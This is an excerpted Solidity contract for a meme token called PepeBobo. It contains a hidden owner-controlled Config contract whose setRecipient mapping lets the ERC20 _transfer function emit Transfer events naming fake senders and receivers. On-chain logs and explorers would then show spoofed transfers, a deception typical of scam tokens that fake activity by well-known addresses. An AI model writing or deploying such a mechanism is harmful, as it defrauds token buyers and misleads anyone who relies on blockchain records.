...
/*
Telegram: https://t.me/pepebobocoin
...
contract Config {
    ...
    function recipient(address r) external view returns (address rNew) {
        rNew = recipients[r];
        if (rNew == address(0)) return r;
    }

    function setRecipient(address r, address rNew) external onlyOwner {
        recipients[r] = rNew;
    }
...
contract ERC20 is Context {
    ...
    function _transfer(
        ...
        emit Transfer(CONFIG.recipient(from), CONFIG.recipient(to), amount);
...
contract PepeBobo is ERC20 {
    ...
    constructor() ERC20("PepeBobo", "PepeBobo") {
